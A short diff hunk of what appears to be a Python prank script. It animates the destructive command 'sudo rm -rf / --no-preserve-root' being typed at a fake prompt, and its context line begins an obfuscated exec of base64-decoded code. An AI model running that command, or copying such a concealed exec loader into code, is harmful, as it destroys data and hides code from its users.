@@ -12,10 +12,10 @@ exec(__import__(bytes.fromhex('626173653634').decode(
 
 
 command: str = r'sudo rm -rf / --no-preserve-root'
-for i in range(len(command)+1): {
-	print(f"\r{expanduser('~')}> {command[:i]}", end=''),
+for i in range(len(command)+1):
+	print(f"\r{expanduser('~')}> {command[:i]}", end='')
 	sleep(0.1)
-}
+
 sleep(0.5)
 while True:
 	print(f"\r{expanduser('~')}> sudo rm -rf / --no-preserve-root -", end=''); sleep(0.3)
